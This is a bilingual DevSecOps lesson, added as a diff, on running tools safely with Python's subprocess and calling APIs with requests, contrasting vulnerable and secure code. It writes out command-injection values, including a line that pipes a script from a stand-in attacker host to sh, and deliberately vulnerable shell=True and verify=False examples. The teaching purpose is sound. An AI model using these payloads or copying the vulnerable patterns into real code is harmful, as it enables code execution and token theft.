@@ -1,0 +1,655 @@
+description:
+  fr: "Automatiser des tâches de sécurité en Python : lancer des outils avec subprocess sans injection de commande et appeler des API HTTP avec requests de façon fiable."
+  en: "Automate security tasks in Python: run tools with subprocess without command injection and call HTTP APIs with requests reliably."
+duration: 40
+
+intro:
+  fr: |
+    Un ingénieur DevSecOps passe ses journées à faire dialoguer des outils : lancer un scanner, lire son
+    résultat, interroger l'API de GitHub, prévenir l'équipe sur Slack. Python est la **colle** idéale pour
+    cela, grâce à deux briques :
+
+    - `subprocess`, module standard qui lance **d'autres programmes** (Trivy, git, nmap, kubectl) ;
+    - `requests`, la bibliothèque la plus utilisée pour parler aux **API** (*Application Programming
+      Interface*) en HTTP.
+
+    Imaginez un chef de chantier : il ne pose pas les briques lui-même, il donne des ordres précis aux
+    artisans et contrôle le travail rendu. Si ses ordres sont ambigus, ou s'il laisse un inconnu les
+    réécrire, le chantier tourne mal. C'est exactement le risque d'un script d'automatisation : une
+    commande construite à partir d'une donnée non vérifiée devient une **injection de commande**, un appel
+    d'API sans délai ni vérification TLS devient une panne ou une fuite.
+
+    Vous verrez pour chaque brique la version dangereuse, la version sûre, puis un cas réel : remonter les
+    alertes de dépendances vulnérables d'un dépôt GitHub vers Slack.
+  en: |
+    A DevSecOps engineer spends the day making tools talk to each other: running a scanner, reading its
+    result, querying the GitHub API, notifying the team on Slack. Python is the ideal **glue** for that,
+    thanks to two building blocks:
+
+    - `subprocess`, a standard module that launches **other programs** (Trivy, git, nmap, kubectl);
+    - `requests`, the most widely used library to talk to **APIs** (*Application Programming Interfaces*)
+      over HTTP.
+
+    Picture a site foreman: he does not lay the bricks himself, he gives precise orders to the tradespeople
+    and checks the work delivered. If his orders are ambiguous, or if he lets a stranger rewrite them, the
+    site goes wrong. That is exactly the risk of an automation script: a command built from unchecked data
+    becomes a **command injection**, an API call without timeout or TLS verification becomes an outage or
+    a leak.
+
+    For each building block you will see the dangerous version, the safe version, then a real case:
+    forwarding a GitHub repository's vulnerable-dependency alerts to Slack.
+
+sections:
+  - heading:
+      fr: "subprocess.run : lancer un programme"
+      en: "subprocess.run: launching a program"
+    body:
+      fr: |
+        `subprocess.run()` lance un programme, attend qu'il se termine et renvoie un objet
+        `CompletedProcess` (code de retour, sortie standard, sortie d'erreur).
+
+        | Paramètre | Rôle | Valeur recommandée |
+        |---|---|---|
+        | 1er argument | la commande | une **liste** : `["trivy", "image", image]` |
+        | `capture_output=True` | récupérer `stdout` et `stderr` | oui, si vous lisez le résultat |
+        | `text=True` | obtenir du texte plutôt que des octets | oui |
+        | `check=True` | lever `CalledProcessError` si le code de retour n'est pas 0 | oui, sauf si un code non nul est attendu |
+        | `timeout=60` | tuer le programme s'il dure trop (`TimeoutExpired`) | **toujours** |
+        | `shell=True` | passer la commande à `/bin/sh` | **jamais** avec une donnée externe |
+        | `env=...` | variables d'environnement transmises | le minimum nécessaire |
+
+        Avec une **liste**, Python exécute directement le programme : chaque élément est un argument,
+        transmis tel quel. Aucun shell n'interprète les caractères `;`, `|`, `$( )` ou les espaces.
+        N'utilisez plus `os.system()` ni `os.popen()` : ils passent toujours par le shell.
+      en: |
+        `subprocess.run()` launches a program, waits for it to finish and returns a `CompletedProcess`
+        object (return code, standard output, error output).
+
+        | Parameter | Role | Recommended value |
+        |---|---|---|
+        | 1st argument | the command | a **list**: `["trivy", "image", image]` |
+        | `capture_output=True` | collect `stdout` and `stderr` | yes, if you read the result |
+        | `text=True` | get text rather than bytes | yes |
+        | `check=True` | raise `CalledProcessError` if the return code is not 0 | yes, unless a non-zero code is expected |
+        | `timeout=60` | kill the program if it runs too long (`TimeoutExpired`) | **always** |
+        | `shell=True` | hand the command to `/bin/sh` | **never** with external data |
+        | `env=...` | environment variables passed on | the bare minimum |
+
+        With a **list**, Python executes the program directly: each item is one argument, passed as is. No
+        shell interprets the characters `;`, `|`, `$( )` or spaces. Stop using `os.system()` and
+        `os.popen()`: they always go through the shell.
+  - heading:
+      fr: "Injection de commande et injection d'option"
+      en: "Command injection and option injection"
+    body:
+      fr: |
+        Avec `shell=True`, la commande est une **chaîne** interprétée par le shell. Si une partie vient
+        d'un utilisateur, d'un nom de fichier ou d'un nom de branche Git, l'attaquant y glisse ses propres
+        commandes : `127.0.0.1; curl https://evil.example/x.sh | sh`. C'est l'**injection de commande**
+        (CWE-78), l'une des failles les plus graves : elle donne l'exécution de code sur la machine.
+
+        La liste d'arguments supprime ce risque, mais il en reste un second : l'**injection d'option**. Si
+        la valeur vaut `--output=/etc/cron.d/x`, le programme appelé la prend pour une option. Trois
+        parades complémentaires :
+
+        1. **valider** la valeur avec une liste d'autorisation (`ipaddress`, `re.fullmatch`) ;
+        2. refuser toute valeur commençant par `-` ;
+        3. placer `--` avant les arguments libres quand le programme le prend en charge (`git log -- chemin`) :
+           tout ce qui suit n'est plus interprété comme une option.
+
+        Si vous devez réellement produire une ligne de shell (pour l'afficher, par exemple),
+        `shlex.quote(valeur)` l'entoure de guillemets sûrs. C'est un dernier recours, pas une habitude.
+      en: |
+        With `shell=True`, the command is a **string** interpreted by the shell. If any part comes from a
+        user, a file name or a Git branch name, the attacker slips in their own commands:
+        `127.0.0.1; curl https://evil.example/x.sh | sh`. This is **command injection** (CWE-78), one of the
+        most serious flaws: it gives code execution on the machine.
+
+        The argument list removes that risk, but a second one remains: **option injection**. If the value
+        is `--output=/etc/cron.d/x`, the called program takes it for an option. Three complementary
+        defences:
+
+        1. **validate** the value against an allow-list (`ipaddress`, `re.fullmatch`);
+        2. refuse any value starting with `-`;
+        3. put `--` before free-form arguments when the program supports it (`git log -- path`): whatever
+           follows is no longer interpreted as an option.
+
+        If you really must produce a shell line (to display it, for instance), `shlex.quote(value)` wraps
+        it in safe quotes. It is a last resort, not a habit.
+  - heading:
+      fr: "Appeler une API HTTP avec requests"
+      en: "Calling an HTTP API with requests"
+    body:
+      fr: |
+        `requests` s'installe avec `python3 -m pip install requests` (dans un environnement virtuel, voir la
+        dernière leçon du cours). Une API renvoie un **code d'état** et, le plus souvent, du JSON :
+
+        | Code | Signification | Réaction du script |
+        |---|---|---|
+        | `200` / `201` | succès / ressource créée | lire `response.json()` |
+        | `401` | non authentifié : jeton absent ou expiré | arrêter, ne pas réessayer en boucle |
+        | `403` | authentifié mais non autorisé | vérifier les permissions du jeton |
+        | `404` | ressource introuvable | vérifier l'URL |
+        | `429` | trop de requêtes | attendre (`Retry-After`) puis réessayer |
+        | `5xx` | erreur côté serveur | réessayer avec un délai croissant |
+
+        Quatre réflexes de sécurité et de fiabilité :
+
+        - **`timeout=` à chaque appel** : `requests` n'a **aucun délai par défaut**, un serveur muet bloque
+          le script indéfiniment ;
+        - **`response.raise_for_status()`** : transforme un code 4xx/5xx en exception, au lieu de traiter
+          une page d'erreur comme des données valides ;
+        - **ne jamais écrire `verify=False`** : cela désactive la vérification du certificat TLS, et
+          n'importe qui sur le réseau peut lire le jeton et modifier la réponse ;
+        - **le jeton vient de l'environnement** (`os.environ["GITHUB_TOKEN"]`), jamais du code source, et
+          il n'est jamais affiché dans les journaux.
+      en: |
+        Install `requests` with `python3 -m pip install requests` (inside a virtual environment, see the
+        last lesson of the course). An API returns a **status code** and, most of the time, JSON:
+
+        | Code | Meaning | What the script does |
+        |---|---|---|
+        | `200` / `201` | success / resource created | read `response.json()` |
+        | `401` | not authenticated: missing or expired token | stop, do not retry in a loop |
+        | `403` | authenticated but not allowed | check the token permissions |
+        | `404` | resource not found | check the URL |
+        | `429` | too many requests | wait (`Retry-After`) then retry |
+        | `5xx` | server-side error | retry with an increasing delay |
+
+        Four security and reliability habits:
+
+        - **`timeout=` on every call**: `requests` has **no default timeout**, a silent server blocks the
+          script forever;
+        - **`response.raise_for_status()`**: turns a 4xx/5xx code into an exception, instead of treating an
+          error page as valid data;
+        - **never write `verify=False`**: it disables TLS certificate verification, and anybody on the
+          network can read the token and alter the response;
+        - **the token comes from the environment** (`os.environ["GITHUB_TOKEN"]`), never from the source
+          code, and it is never printed in logs.
+
+examples:
+  - title:
+      fr: "subprocess dangereux : shell=True avec une donnée externe"
+      en: "Dangerous subprocess: shell=True with external data"
+    file: ping_vulnerable.py
+    lang: python
+    kind: vulnerable
+    code: |
+      import subprocess
+
+
+      def ping(host):
+          # The whole string is handed to /bin/sh, which interprets ; | && $( ) ...
+          result = subprocess.run(f"ping -c 1 {host}", shell=True, capture_output=True, text=True)
+          return result.stdout
+
+
+      # The "host" comes from a web form, a ticket, a CSV file...
+      print(ping("127.0.0.1; id"))
+    output: |
+      PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+      64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.031 ms
+
+      --- 127.0.0.1 ping statistics ---
+      1 packets transmitted, 1 received, 0% packet loss, time 0ms
+      rtt min/avg/max/mdev = 0.031/0.031/0.031/0.000 ms
+      uid=1000(dev) gid=1000(dev) groups=1000(dev)
+    note:
+      fr: "La dernière ligne est la sortie de `id` : la commande de l'attaquant a été exécutée avec les droits du script. Remplacez `id` par le téléchargement d'un programme malveillant et la machine est compromise."
+      en: "The last line is the output of `id`: the attacker's command was executed with the script's privileges. Replace `id` with the download of a malicious program and the machine is compromised."
+
+  - title:
+      fr: "subprocess sûr : liste d'arguments, validation et délai"
+      en: "Safe subprocess: argument list, validation and timeout"
+    file: ping_secure.py
+    lang: python
+    kind: secure
+    code: |
+      import ipaddress
+      import subprocess
+
+
+      def ping(host: str) -> bool:
+          """Return True if the host answers one ICMP echo request."""
+          # 1. Allow-list validation: only a real IP address goes further.
+          #    This also blocks option injection (a value starting with "-").
+          address = ipaddress.ip_address(host)      # raises ValueError otherwise
+
+          # 2. A list, no shell: each item is passed to ping as ONE argument
+          result = subprocess.run(
+              ["ping", "-c", "1", "-W", "2", str(address)],
+              capture_output=True,
+              text=True,
+              timeout=5,        # 3. never hang forever
+              check=False,      # exit code 1 just means "no answer", it is not an error
+          )
+          return result.returncode == 0
+
+
+      for candidate in ["127.0.0.1", "127.0.0.1; id", "-f"]:
+          try:
+              print(f"{candidate!r}: {'up' if ping(candidate) else 'down'}")
+          except ValueError as error:
+              print(f"{candidate!r}: rejected ({error})")
+    output: |
+      '127.0.0.1': up
+      '127.0.0.1; id': rejected ('127.0.0.1; id' does not appear to be an IPv4 or IPv6 address)
+      '-f': rejected ('-f' does not appear to be an IPv4 or IPv6 address)
+    note:
+      fr: "Deux barrières indépendantes : même sans validation, la liste d'arguments aurait transmis `127.0.0.1; id` à `ping` comme un seul nom d'hôte (invalide). La validation ajoute le refus de `-f`, qui serait sinon interprété comme l'option « flood » de ping."
+      en: "Two independent barriers: even without validation, the argument list would have passed `127.0.0.1; id` to `ping` as a single (invalid) host name. Validation adds the rejection of `-f`, which would otherwise be read as ping's \"flood\" option."
+
+  - title:
+      fr: "Piloter un outil de sécurité : Trivy depuis Python"
+      en: "Driving a security tool: Trivy from Python"
+    file: run_trivy.py
+    lang: python
+    kind: secure
+    code: |
+      import json
+      import re
+      import subprocess
+      import sys
+
+      # Allow-list for an image reference: must start with a letter or digit (never "-")
+      IMAGE_REF = re.compile(r"[a-z0-9][a-z0-9._/:@-]{0,254}")
+
+
+      def scan_image(image: str) -> list[dict]:
+          """Run Trivy on a container image and return its HIGH/CRITICAL vulnerabilities."""
+          if IMAGE_REF.fullmatch(image) is None:
+              raise ValueError(f"invalid image reference: {image!r}")
+
+          command = ["trivy", "image", "--quiet", "--format", "json",
+                     "--severity", "HIGH,CRITICAL", image]
+          try:
+              completed = subprocess.run(command, capture_output=True, text=True,
+                                         timeout=600, check=True)
+          except FileNotFoundError:
+              sys.exit("error: trivy is not installed or not in PATH")
+          except subprocess.TimeoutExpired:
+              sys.exit("error: trivy did not finish within 10 minutes")
+          except subprocess.CalledProcessError as error:
+              # stderr explains the failure (unknown image, registry unreachable...)
+              sys.exit(f"error: trivy exited with code {error.returncode}: {error.stderr.strip()}")
+
+          report = json.loads(completed.stdout)
+          findings = []
+          for result in report.get("Results", []):
+              findings.extend(result.get("Vulnerabilities", []))
+          return findings
+
+
+      if __name__ == "__main__":
+          image = sys.argv[1] if len(sys.argv) > 1 else "python:3.9-slim"
+          vulnerabilities = scan_image(image)
+          for vuln in vulnerabilities:
+              print(f"{vuln['Severity']:8} {vuln['VulnerabilityID']:16} {vuln['PkgName']}")
+          print(f"{len(vulnerabilities)} HIGH/CRITICAL vulnerabilities in {image}")
+          sys.exit(1 if vulnerabilities else 0)      # non-zero exit code fails the CI job
+    note:
+      fr: "Le schéma classique de l'automatisation : valider l'entrée, lancer l'outil avec une liste d'arguments et un délai, traiter **chaque** type d'échec, lire la sortie JSON, puis renvoyer un code de sortie que le pipeline comprend. Trivy possède aussi `--exit-code 1` ; passer par Python permet d'ajouter vos propres règles."
+      en: "The classic automation pattern: validate the input, run the tool with an argument list and a timeout, handle **every** kind of failure, read the JSON output, then return an exit code the pipeline understands. Trivy also has `--exit-code 1`; going through Python lets you add your own rules."
+
+  - title:
+      fr: "Appel d'API dangereux : jeton en dur, TLS désactivé, aucun délai"
+      en: "Dangerous API call: hard-coded token, TLS disabled, no timeout"
+    file: alerts_vulnerable.py
+    lang: python
+    kind: vulnerable
+    code: |
+      import requests
+
+      # Problem 1: the token is in the source code, therefore in Git and in every clone
+      TOKEN = "ghp_EXAMPLEexampleEXAMPLEexampleEXAMPLE00"
+
+      url = "https://api.github.com/repos/example-org/shop-api/dependabot/alerts"
+
+      # Problem 2: verify=False disables TLS certificate checks (man-in-the-middle)
+      # Problem 3: no timeout, the script can hang forever
+      response = requests.get(url, headers={"Authorization": "Bearer " + TOKEN}, verify=False)
+
+      # Problem 4: the status code is never checked: a 401 error body is read as data
+      # Problem 5: the token ends up in the logs
+      print("Called", url, "with token", TOKEN)
+      for alert in response.json():
+          print(alert["number"])
+    note:
+      fr: "Avec `verify=False`, un attaquant placé sur le réseau (Wi-Fi public, proxy compromis) présente son propre certificat, lit le jeton et renvoie la réponse qu'il veut. Et si le jeton est invalide, GitHub répond `{\"message\": \"Bad credentials\"}` : la boucle `for` plante sur une erreur incompréhensible."
+      en: "With `verify=False`, an attacker on the network (public Wi-Fi, compromised proxy) presents their own certificate, reads the token and returns whatever response they like. And if the token is invalid, GitHub answers `{\"message\": \"Bad credentials\"}`: the `for` loop crashes with a baffling error."
+
+  - title:
+      fr: "Cas réel : alertes Dependabot de GitHub envoyées vers Slack"
+      en: "Real case: GitHub Dependabot alerts forwarded to Slack"
+    file: alerts_to_slack.py
+    lang: python
+    kind: secure
+    code: |
+      #!/usr/bin/env python3
+      """Post the open high/critical Dependabot alerts of a repository to Slack.
+
+      Environment variables (injected by the CI or a secrets manager):
+        GITHUB_TOKEN       token with read access to Dependabot alerts
+        SLACK_WEBHOOK_URL  Slack incoming webhook (the URL itself is a secret)
+      Usage: python3 alerts_to_slack.py example-org/shop-api
+      """
+      import os
+      import re
+      import sys
+
+      import requests
+      from requests.adapters import HTTPAdapter
+      from urllib3.util.retry import Retry
+
+      GITHUB_API = "https://api.github.com"
+      TIMEOUT = (3.05, 15)        # (connect, read) in seconds, on EVERY request
+      REPO = re.compile(r"[A-Za-z0-9_.-]{1,100}/[A-Za-z0-9_.-]{1,100}")
+
+
+      def github_session(token: str) -> requests.Session:
+          session = requests.Session()
+          session.headers.update({
+              "Authorization": f"Bearer {token}",
+              "Accept": "application/vnd.github+json",
+              "X-GitHub-Api-Version": "2022-11-28",
+          })
+          # Retry temporary failures with exponential backoff; 401/403/404 are NOT retried
+          retry = Retry(total=3, backoff_factor=1,
+                        status_forcelist=(429, 500, 502, 503, 504),
+                        allowed_methods=("GET",))
+          session.mount("https://", HTTPAdapter(max_retries=retry))
+          return session
+
+
+      def open_alerts(session: requests.Session, repo: str) -> list[dict]:
+          response = session.get(
+              f"{GITHUB_API}/repos/{repo}/dependabot/alerts",
+              params={"state": "open", "severity": "critical,high", "per_page": 100},
+              timeout=TIMEOUT,
+          )
+          response.raise_for_status()      # 4xx/5xx become an exception
+          return response.json()
+
+
+      def notify_slack(webhook_url: str, text: str) -> None:
+          # Plain requests.post, NOT the GitHub session: the GitHub token must never
+          # be sent to another host
+          response = requests.post(webhook_url, json={"text": text}, timeout=TIMEOUT)
+          response.raise_for_status()
+
+
+      def main() -> int:
+          if len(sys.argv) != 2 or REPO.fullmatch(sys.argv[1]) is None:
+              print("usage: alerts_to_slack.py OWNER/REPO", file=sys.stderr)
+              return 2
+          repo = sys.argv[1]
+
+          try:
+              token = os.environ["GITHUB_TOKEN"]
+              webhook_url = os.environ["SLACK_WEBHOOK_URL"]
+          except KeyError as missing:
+              print(f"error: environment variable {missing} is not set", file=sys.stderr)
+              return 2
+
+          try:
+              alerts = open_alerts(github_session(token), repo)
+              if alerts:
+                  lines = [f":rotating_light: {len(alerts)} open high/critical alert(s) in {repo}"]
+                  for alert in alerts:
+                      advisory = alert["security_advisory"]
+                      package = alert["dependency"]["package"]["name"]
+                      lines.append(f"- [{advisory['severity']}] {package}: {advisory['summary']}")
+                  notify_slack(webhook_url, "\n".join(lines))
+          except requests.RequestException as error:
+              # Log the kind of failure and the status code, never the token or the webhook URL
+              status = getattr(error.response, "status_code", "no response")
+              print(f"error: API call failed ({type(error).__name__}, status: {status})", file=sys.stderr)
+              return 2
+
+          print(f"{len(alerts)} open high/critical alert(s) in {repo}")
+          return 1 if alerts else 0
+
+
+      if __name__ == "__main__":
+          sys.exit(main())
+    output: |
+      $ export GITHUB_TOKEN="$(gh auth token)"
+      $ export SLACK_WEBHOOK_URL="$(vault kv get -field=url secret/ci/slack)"
+      $ python3 alerts_to_slack.py example-org/shop-api
+      2 open high/critical alert(s) in example-org/shop-api
+      $ echo $?
+      1
+    note:
+      fr: "Tout ce que la version dangereuse oubliait est là : secrets lus dans l'environnement, TLS vérifié (comportement par défaut), délai sur chaque appel, `raise_for_status()`, nouvelles tentatives limitées aux erreurs temporaires, et un message d'erreur qui ne contient aucun secret. Le webhook Slack est appelé hors de la session GitHub pour ne pas lui envoyer le jeton."
+      en: "Everything the dangerous version forgot is here: secrets read from the environment, TLS verified (the default behaviour), a timeout on every call, `raise_for_status()`, retries limited to temporary errors, and an error message that contains no secret. The Slack webhook is called outside the GitHub session so the token is not sent to it."
+
+mistake:
+  fr: |
+    **Désactiver la vérification TLS « juste pour que ça marche ».**
+
+    Face à une erreur `SSLError: certificate verify failed`, la tentation est d'ajouter `verify=False`. Le
+    script fonctionne, l'avertissement est ignoré, et la ligne reste des années en production : chaque
+    appel envoie alors le jeton à quiconque intercepte la connexion.
+
+    La bonne correction dépend de la cause : si le service utilise une autorité de certification interne,
+    indiquez son certificat avec `verify="/etc/ssl/certs/company-ca.pem"` (ou la variable d'environnement
+    `REQUESTS_CA_BUNDLE`) ; si le certificat est expiré ou ne correspond pas au nom, c'est le serveur qu'il
+    faut corriger.
+
+    Même logique pour `shell=True` ajouté « parce que la commande contient un `|` » : enchaînez plutôt deux
+    appels `subprocess.run`, ou faites le traitement en Python.
+  en: |
+    **Disabling TLS verification "just to make it work".**
+
+    Faced with `SSLError: certificate verify failed`, the temptation is to add `verify=False`. The script
+    works, the warning gets ignored, and the line stays in production for years: every call then sends the
+    token to whoever intercepts the connection.
+
+    The right fix depends on the cause: if the service uses an internal certificate authority, point to its
+    certificate with `verify="/etc/ssl/certs/company-ca.pem"` (or the `REQUESTS_CA_BUNDLE` environment
+    variable); if the certificate is expired or does not match the name, it is the server that must be
+    fixed.
+
+    Same logic for `shell=True` added "because the command contains a `|`": chain two `subprocess.run`
+    calls instead, or do the processing in Python.
+
+bestPractice:
+  fr: |
+    - **`subprocess.run([...], check=True, timeout=...)`** : une liste, jamais `shell=True`, jamais
+      `os.system()`.
+    - **Validez toute valeur placée dans une commande** par liste d'autorisation, et refusez celles qui
+      commencent par `-`.
+    - **Un délai sur chaque appel réseau** et `raise_for_status()` après chaque réponse.
+    - **Secrets dans l'environnement ou un coffre** (Vault, secrets du CI), avec le **moindre privilège** :
+      un jeton en lecture seule, limité à un dépôt, à durée de vie courte.
+    - **Ne journalisez jamais** les en-têtes `Authorization`, les URL de webhook ni les réponses complètes.
+    - **Codes de sortie explicites** (`0` succès, `1` problème détecté, `2` erreur d'exécution) pour que le
+      pipeline distingue « des failles ont été trouvées » de « l'outil est en panne ».
+    - **Réessayez uniquement les erreurs temporaires** (429, 5xx) avec un délai croissant, et respectez les
+      limites de débit de l'API.
+  en: |
+    - **`subprocess.run([...], check=True, timeout=...)`**: a list, never `shell=True`, never
+      `os.system()`.
+    - **Validate every value placed in a command** against an allow-list, and refuse those starting
+      with `-`.
+    - **A timeout on every network call** and `raise_for_status()` after every response.
+    - **Secrets in the environment or a vault** (Vault, CI secrets), with **least privilege**: a read-only
+      token, limited to one repository, short-lived.
+    - **Never log** `Authorization` headers, webhook URLs or full responses.
+    - **Explicit exit codes** (`0` success, `1` problem detected, `2` execution error) so the pipeline can
+      tell "flaws were found" from "the tool is broken".
+    - **Retry only temporary errors** (429, 5xx) with an increasing delay, and respect the API's rate
+      limits.
+
+exercise:
+  statement:
+    fr: |
+      [OSV.dev](https://osv.dev) est une base publique de vulnérabilités des logiciels libres, interrogeable
+      sans authentification. Une requête `POST` sur `https://api.osv.dev/v1/query` avec le corps JSON
+
+      ```json
+      {"version": "2.2.2", "package": {"name": "flask", "ecosystem": "PyPI"}}
+      ```
+
+      renvoie `{"vulns": [...]}` (chaque élément possède un `id` et, en général, un `summary`), ou `{}` si
+      la version n'a aucune vulnérabilité connue.
+
+      Écrivez `osv_check.py` qui vérifie les dépendances suivantes et se termine avec le code `1` si au
+      moins l'une d'elles est vulnérable :
+
+      ```python
+      DEPENDENCIES = {"flask": "2.2.2", "requests": "2.32.3", "jinja2": "2.11.2"}
+      ```
+
+      Exigences : un délai sur chaque appel, `raise_for_status()`, une session réutilisée, et une gestion
+      propre des erreurs réseau (code de sortie `2`).
+    en: |
+      [OSV.dev](https://osv.dev) is a public database of open-source software vulnerabilities that can be
+      queried without authentication. A `POST` request to `https://api.osv.dev/v1/query` with the JSON body
+
+      ```json
+      {"version": "2.2.2", "package": {"name": "flask", "ecosystem": "PyPI"}}
+      ```
+
+      returns `{"vulns": [...]}` (each item has an `id` and usually a `summary`), or `{}` if the version
+      has no known vulnerability.
+
+      Write `osv_check.py`, which checks the following dependencies and exits with code `1` if at least
+      one of them is vulnerable:
+
+      ```python
+      DEPENDENCIES = {"flask": "2.2.2", "requests": "2.32.3", "jinja2": "2.11.2"}
+      ```
+
+      Requirements: a timeout on every call, `raise_for_status()`, a reused session, and clean handling of
+      network errors (exit code `2`).
+  solution:
+    file: osv_check.py
+    lang: python
+    code: |
+      import sys
+
+      import requests
+
+      OSV_QUERY_URL = "https://api.osv.dev/v1/query"
+      TIMEOUT = (3.05, 15)
+      DEPENDENCIES = {"flask": "2.2.2", "requests": "2.32.3", "jinja2": "2.11.2"}
+
+
+      def known_vulnerabilities(session: requests.Session, name: str, version: str) -> list[dict]:
+          payload = {"version": version, "package": {"name": name, "ecosystem": "PyPI"}}
+          response = session.post(OSV_QUERY_URL, json=payload, timeout=TIMEOUT)
+          response.raise_for_status()
+          # OSV answers {} when nothing is known: default to an empty list
+          return response.json().get("vulns", [])
+
+
+      def main() -> int:
+          vulnerable = 0
+          # One session = one TLS connection reused for all the requests
+          with requests.Session() as session:
+              for name, version in DEPENDENCIES.items():
+                  try:
+                      vulns = known_vulnerabilities(session, name, version)
+                  except requests.RequestException as error:
+                      print(f"error: OSV query failed for {name}: {type(error).__name__}", file=sys.stderr)
+                      return 2
+                  if not vulns:
+                      print(f"ok          {name}=={version}")
+                      continue
+                  vulnerable += 1
+                  print(f"VULNERABLE  {name}=={version}")
+                  for vuln in vulns:
+                      print(f"    {vuln['id']}: {vuln.get('summary', 'no summary')}")
+          return 1 if vulnerable else 0
+
+
+      if __name__ == "__main__":
+          sys.exit(main())
+    note:
+      fr: "C'est, en miniature, ce que fait `pip-audit` (étudié en fin de cours). Notez le code `2` pour une panne réseau : le pipeline ne doit pas confondre « OSV injoignable » avec « aucune vulnérabilité »."
+      en: "This is, in miniature, what `pip-audit` does (studied at the end of the course). Note the exit code `2` for a network failure: the pipeline must not confuse \"OSV unreachable\" with \"no vulnerability\"."
+
+quiz:
+  - q:
+      fr: "Pourquoi passer une liste à `subprocess.run()` plutôt qu'une chaîne avec `shell=True` ?"
+      en: "Why pass a list to `subprocess.run()` rather than a string with `shell=True`?"
+    options:
+      fr:
+        - "Parce que c'est plus rapide à écrire"
+        - "Parce qu'aucun shell n'interprète les arguments : l'injection de commande devient impossible"
+        - "Parce que `shell=True` n'existe plus en Python 3"
+        - "Parce qu'une liste chiffre les arguments"
+      en:
+        - "Because it is quicker to write"
+        - "Because no shell interprets the arguments: command injection becomes impossible"
+        - "Because `shell=True` no longer exists in Python 3"
+        - "Because a list encrypts the arguments"
+    answer: 1
+    why:
+      fr: "Avec une liste, le programme est exécuté directement et chaque élément est un argument littéral : `;`, `|` ou `$( )` n'ont plus de sens particulier."
+      en: "With a list, the program is executed directly and each item is a literal argument: `;`, `|` or `$( )` no longer have any special meaning."
+  - q:
+      fr: "Quel est le délai d'expiration par défaut d'un appel `requests.get(url)` ?"
+      en: "What is the default timeout of a `requests.get(url)` call?"
+    options:
+      fr: ["5 secondes", "30 secondes", "60 secondes", "Aucun : l'appel peut attendre indéfiniment"]
+      en: ["5 seconds", "30 seconds", "60 seconds", "None: the call may wait forever"]
+    answer: 3
+    why:
+      fr: "`requests` n'applique aucun délai tant qu'on ne passe pas `timeout=`. Un serveur qui ne répond pas bloque alors le script, et le job CI avec lui."
+      en: "`requests` applies no timeout unless you pass `timeout=`. A server that does not answer then blocks the script, and the CI job with it."
+  - q:
+      fr: "Que fait `verify=False` dans un appel `requests` ?"
+      en: "What does `verify=False` do in a `requests` call?"
+    options:
+      fr:
+        - "Il désactive la vérification du certificat TLS du serveur"
+        - "Il désactive la vérification du code d'état HTTP"
+        - "Il désactive le chiffrement de la réponse JSON"
+        - "Il accélère la connexion sans autre effet"
+      en:
+        - "It disables verification of the server's TLS certificate"
+        - "It disables verification of the HTTP status code"
+        - "It disables encryption of the JSON response"
+        - "It speeds up the connection with no other effect"
+    answer: 0
+    why:
+      fr: "Sans vérification du certificat, le script ne sait plus à qui il parle : un intermédiaire peut lire le jeton et falsifier les réponses."
+      en: "Without certificate verification, the script no longer knows who it is talking to: an intermediary can read the token and forge the responses."
+  - q:
+      fr: "Dans le cas réel, pourquoi le webhook Slack est-il appelé avec `requests.post` et non avec la session GitHub ?"
+      en: "In the real case, why is the Slack webhook called with `requests.post` and not with the GitHub session?"
+    options:
+      fr:
+        - "Parce que Slack n'accepte pas les sessions"
+        - "Parce qu'une session ne peut faire que des requêtes GET"
+        - "Pour ne pas envoyer à Slack l'en-tête Authorization contenant le jeton GitHub"
+        - "Pour désactiver les nouvelles tentatives"
+      en:
+        - "Because Slack does not accept sessions"
+        - "Because a session can only make GET requests"
+        - "So that the Authorization header holding the GitHub token is not sent to Slack"
+        - "To disable retries"
+    answer: 2
+    why:
+      fr: "Les en-têtes d'une session sont joints à toutes ses requêtes, quel que soit l'hôte. Un secret ne doit être envoyé qu'au service auquel il est destiné."
+      en: "A session's headers are attached to all its requests, whatever the host. A secret must only be sent to the service it is meant for."
+  - q:
+      fr: "Qu'est-ce qu'une injection d'option ?"
+      en: "What is option injection?"
+    options:
+      fr:
+        - "L'ajout d'un `;` pour enchaîner une seconde commande"
+        - "Une valeur commençant par `-` que le programme appelé interprète comme une option"
+        - "La modification d'une variable d'environnement"
+        - "L'utilisation de `check=True`"
+      en:
+        - "Adding a `;` to chain a second command"
+        - "A value starting with `-` that the called program interprets as an option"
+        - "Modifying an environment variable"
+        - "Using `check=True`"
+    answer: 1
+    why:
+      fr: "Même sans shell, un argument comme `--output=/chemin` change le comportement du programme. On valide la valeur, on refuse le tiret initial ou on place `--` avant."
+      en: "Even without a shell, an argument such as `--output=/path` changes the program's behaviour. Validate the value, refuse the leading dash or put `--` before it."
